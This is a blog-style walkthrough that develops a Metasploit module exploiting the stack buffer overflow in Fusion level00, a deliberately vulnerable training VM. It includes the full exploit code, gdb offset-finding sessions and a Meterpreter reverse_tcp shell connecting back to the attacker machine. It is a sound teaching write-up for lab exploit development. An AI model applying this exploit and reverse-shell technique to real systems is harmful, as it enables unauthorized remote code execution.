---
layout: post
title: Fusion level00 write up
excerpt: "Learn to write a simple stack buffer overflow exploit from scratch. This walkthrough is beginner friendly as no mitigations are enabled! Bonus: the exploit will be developed as a Metasploit module."
permalink: "fusion/level00"
categories: Exploit-dev
tags:
  - Exploit-dev
---


This post details a walkthrough for level00 of the Fusion [exploit exercise](https://exploit-exercises.com). This level contains a stack buffer overflow and no mitigations are enabled. This walkthrough will develop the exploit using the Metasploit framework.

## Initial Setup
---
* Download and install the Fusion virtal machine: [https://exploit-exercises.com/download/](https://exploit-exercises.com/download/)
* Update the version of GDB to a newer version, [instructions]({{ site.baseurl}}/building_gdb/)
* Download and source each of these GDB commands: [https://github.com/philwantsfish/gdb_commands](https://github.com/philwantsfish/gdb_commands)
* Install Metasploit, helpful install [instructions](http://www.darkoperator.com/installing-metasploit-in-ubunt/)

## Bug Analysis
---

The code for level00 is found here: [https://exploit-exercises.com/fusion/level00/](https://exploit-exercises.com/fusion/level00/)

This level contains a small web server that listens on an unknown port and calls the `parse_http_request` function for each connection. The `parse_http_request` will read 1024 bytes from the network connection and store this data into a buffer for processing.

{% highlight C %}
if(read(0, buffer, sizeof(buffer)) <= 0) errx(0, "Failed to read from remote host");
if(memcmp(buffer, "GET ", 4) != 0) errx(0, "Not a GET request");

path = &buffer[4];
q = strchr(path, ' ');
if(! q) errx(0, "No protocol version specified");
*q++ = 0;
if(strncmp(q, "HTTP/1.1", 8) != 0) errx(0, "Invalid protocol")
{% endhighlight %}

The buffer must start with "GET path HTTP/1.1", where path is an arbitrary string. The path data is passed to the `fix_path` function:

{% highlight C %}
int fix_path(char *path)
{
  char resolved[128];

  if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
  strcpy(path, resolved);
}
{% endhighlight %}

The result of `realpath` is stored in a 128 byte buffer. The `realpath` function resolves `./` or `../ ` paths and resolves symlinks. This function is the source of the buffer overflow because the path string is of arbitrary length. Sending a long path should cause a buffer overflow.

## Building the proof of concept
---

Access the fusion machine over ssh using the credentials fusion/godmode, root access can be achieved using `sudo -s` with the password godmode. First determine of the PID of the level00 process and the port it is listening on.

{% highlight bash %}
root@fusion:~# lsof -i
COMMAND     PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
...snip...
level00    1459    20000    3u  IPv4  12402      0t0  TCP *:20000 (LISTEN)
...snip...
{% endhighlight %}

The level00 process is using PID 1459 and listening on port 20000. This is confirmed using netcat to connect to port 20000:

{% highlight bash %}
pwf@ubuntu:~$ nc 192.168.79.132 20000
[debug] buffer is at 0xbffff8f8 :-)
we found it
level00: Not a GET request
pwf@ubuntu:~$
{% endhighlight %}

Next attach gdb to this process and check which mitigations are enabled:

{% highlight bash %}
root@fusion:~# gdb -q
(gdb) attach 1459
Attaching to process 1459
Reading symbols from /opt/fusion/bin/level00...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
0xb7fdf424 in __kernel_vsyscall ()
(gdb) checksec
| NX  | PIE | Canary | Relro   | Path      
| No  | No  | No     | No      | /opt/fusion/bin/level00
| Yes | Yes | Yes    | Partial | /lib/i386-linux-gnu/libc.so.6
| Yes | Yes | No     | Partial | /lib/ld-linux.so.2

(gdb) c
Continuing.
{% endhighlight %}

Just as the introduction suggested, the level00 binary is not compiled with any exploit mitigations. The following can be used as a skeleton remote TCP Metasploit module. I created the module at the following path: `/opt/metasploit-framework/modules/exploits/fusion/level00.rb`

{% highlight Ruby %}
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fusion level00 remote stack buffer overflow',
      'Description'    => %q{
                           This module exploits a stack buffer overflow in level00 of the
                           fusion exploit exercises.
                           },
      'Author'         => [ 'Philip OKeefe' ],
      'Version'        => '1',
      'DefaultOptions' =>
              {
                      'EXITFUNC' => 'process',
              },
      'Payload'        =>
              {
                      'Space'    => 1400,
                      'BadChars' => "\x00",
                      'StackAdjustment' => -4000,
              },
      'Platform'       => 'linux',

      'Targets'        =>
              [
                      ['Linux', {} ],
              ],
      'DefaultTarget' => 0,
      'Privileged'     => false
      ))

      register_options(
      [
              Opt::RHOST("192.168.79.132"),
              Opt::RPORT(20000),
      ], self.class)
   end

   def exploit
    # exploit code goes here!
   end
end
{% endhighlight %}

Remember to replace the `register_options` array with the IP of your local fusion VM. In hopes of causing a crash lets modify the exploit method to send a payload with an overly long string of 'A' characters for the path.


{% highlight Ruby %}
def exploit
  # Open a TCP connection to the server
  connect

  # Recieve the servers debug message
  data = sock.recv(1024)

  # Create our payload
  filename = "/home/fusion/" + "A" * 500
  sploit = "GET #{filename} HTTP/1.1\r\n" + "B" * 500

  # Send the payload
  sock.put(sploit)

  handler
  disconnect
end
{% endhighlight %}

Send the exploit and check gdb:

{% highlight bash %}
pwf@ubuntu:/opt/metasploit-framework$ msfconsole
[*] Starting the Metasploit Framework console...\

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]
+ -- --=[ 1438 exploits - 809 auxiliary - 230 post        ]
+ -- --=[ 363 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/fusion/level00
msf exploit(level00) > exploit

[*] Started reverse handler on 192.168.79.129:4444
msf exploit(level00) >

......switch to gdb console.....

(gdb) c
Continuing.
{% endhighlight %}

Huh, Gdb never caught an exception!?

This is because the process fork'd before calling `parse_http_response` and by default GDB does not attach to the child process. To change this behavior use the following command and send the exploit again: `(gdb) set follow-fork-mode child`

{% highlight bash %}
(gdb) c
Continuing.
[New process 9997]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 9997]
0x41414141 in ?? ()
(gdb)
{% endhighlight %}

Success! The realpath function copied our string of 'A' characters into the resolved buffer causing a buffer overflow. This crashed on `0x41414141` because the the saved return pointer on the stack was overwritten with the string of 'A' characers.

Note: While developing the exploit we will be attaching the debugger many times. Rather than having to enable follow-fork-mode and source the commands each time, they can be placed in a file called .gdbinit. When gdb first starts it checks the local directory for this file and executes each command in it. While developing this exploit my .gdbinit file looks like:

{% highlight bash %}
source /home/fusion/gdb-checksec.py
source /home/fusion/gdb-pattern.py

set follow-fork-mode child
attach <pid>
c
{% endhighlight %}

## Building the exploit
---
Using the Metasploit acyclic pattern we can determine exactly which four 'A' characters overwrote the saved return pointer. Modify the exploit method to use the Metasploit pattern:

{% highlight Ruby %}
...
# Create our payload
filename = "/home/fusion/" + "A" + Rex::Text::pattern_create(500)
sploit = "GET #{filename} HTTP/1.1\r\n" + "B" * 500
...
{% endhighlight %}

Attach gdb to the level00 process again. Enter the `reload` command in msfconsole to reload the modules code and send the exploit.

{% highlight bash %}
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 10162]
0x30654139 in ?? ()
(gdb) pattern_offset eip
127
(gdb)
{% endhighlight %}

_Note: The_ `pattern_offset eip` _command will take the value out of the eip register and output the offset into the pattern that value was found_

The value of eip is controlled by the 4 bytes at offset 127. Controlling the value eip allows us to execute code at an arbitrary address. To finish the exploit we need to get a payload somewhere in memory and put the location of the payload into eip. The level00 page gives a hint:

_"Hint: Storing your shellcode inside of the fixpath ‘resolved’ buffer might be a bad idea due to character restrictions due to realpath(). Instead, there is plenty of room after the HTTP/1.1 that you can use that will be ideal (and much larger)."_

Rather than trying to to put a payload into the path string replace the string of 'B's in the module with the payload. To find where the string of 'B's is located we can use the Metasploit pattern again. Modify the module to use a pattern length of 2000 in replace of the 'B's.

{% highlight bash %}
...
# Create our payload
filename = "/home/fusion/" + "A" + Rex::Text::pattern_create(500)
sploit = "GET #{filename} HTTP/1.1\r\n" + Rex::Text::pattern_create(2000)
...
{% endhighlight %}

Attach gdb to the process, reload the module, and send the exploit:

{% highlight bash %}
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 10210]
0x30654139 in ?? ()
(gdb) pattern_find
| Address    | Length | Region
| 0xbffff865 | 200    | [stack]
| 0xbffff9e4 | 788    | [stack]
(gdb)
{% endhighlight %}

_Note: The_ `pattern_find` _command will find all occurances of the Metasploit pattern in memory and output its length and location._

Above we see two patterns were found. The first pattern is the path string, which was truncated to 200 bytes. The second pattern is payload which was truncated to 788 bytes. Luckily 788 bytes is just large enough for a meterpreter shell. In the module header options change the available space from 1400 to 788. The Metasploit checks this value when creating the payload.

Replace the data at offset 127 with the string address `0xbffff9e4` in little endian. This should execute the payload. For now make the payload a set of breakpoints to know we are attempting to execute it.

{% highlight Ruby %}
def exploit
  connect
  # Recieve the servers debug message
  data = sock.recv(1024)

  # Overwrite eip with the address of our payload
  junk = "A" * 127
  ret = [0xbffff9da].pack('V')
  trailing_junk = "B" * ( 200 - junk.length - ret.length )
  filename = "/home/fusion/" + junk + ret + trailing_junk

  # For now make the payload breakpoints
  sploit = "GET #{filename} HTTP/1.1\r\n" + "\xCC"*1000

  # Send the payload
  sock.put(sploit)

  disconnect
end
{% endhighlight %}

Attach gdb to the process again. Reload the module and send the exploit

{% highlight bash %}
Program received signal SIGTRAP, Trace/breakpoint trap.
[Switching to process 10329]
0xbffff9e0 in ?? ()
(gdb) x/5i $eip
=> 0xbffff9e0:  int3   
   0xbffff9e1:  int3   
   0xbffff9e2:  int3   
   0xbffff9e3:  int3   
   0xbffff9e4:  int3
(gdb)
{% endhighlight %}

Confirmed eip is executing the payloadi of breakpoints. The last step is changing the payload to a metsploit payload rather than breakpoints.

{% highlight Ruby %}
...
sploit = "GET #{filename} HTTP/1.1\r\n" + payload.encoded
...
{% endhighlight %}


{% highlight bash %}
msf exploit(level00) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(level00) > show options

Module options (exploit/fusion/level00):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.79.132   yes       The target address
   RPORT  20000            yes       The target port


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST                          yes       The listen address
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux


msf exploit(level00) > set LHOST 192.168.79.129
LHOST => 192.168.79.129
msf exploit(level00) > exploit

[*] Started reverse handler on 192.168.79.129:4444
[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
[*] Sending stage (1241088 bytes) to 192.168.79.132
[*] Meterpreter session 1 opened (192.168.79.129:4444 -> 192.168.79.132:56754) at 2015-04-09 00:56:53 -0700

{% endhighlight %}

Finally a meterpreter shell! The puzzle is solved. Below is the full module:

{% highlight Ruby %}
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Fusion level00 remote stack buffer overflow',
      'Description'    => %q{
                           This module exploits a stack buffer overflow in level00 of the
                           fusion exploit exercises.
                           },
      'Author'         => [ 'Philip OKeefe' ],
      'Version'        => '1',
      'DefaultOptions' =>
              {
                      'EXITFUNC' => 'process',
              },
      'Payload'        =>
              {
                      'Space'    => 788,
                      'BadChars' => "\x00",
                      'StackAdjustment' => -4000,
              },
      'Platform'       => 'linux',

      'Targets'        =>
              [
                      ['Linux', {} ],
              ],
      'DefaultTarget' => 0,
      'Privileged'     => false
      ))

      register_options(
      [
              Opt::RHOST("192.168.79.132"),
              Opt::RPORT(20000),
      ], self.class)
   end

   def exploit
    connect
    # Recieve the servers debug message
    data = sock.recv(1024)

    # Overwrite eip with the address of our payload
    junk = "A" * 127
    ret = [0xbffff9da].pack('V')
    trailing_junk = "B" * ( 200 - junk.length - ret.length )
    filename = "/home/fusion/" + junk + ret + trailing_junk

    # Create the exploit string
    sploit = "GET #{filename} HTTP/1.1\r\n #{payload.encoded}"

    # Send the exploit
    sock.put(sploit)

    handler
    disconnect
   end
end
{% endhighlight %}
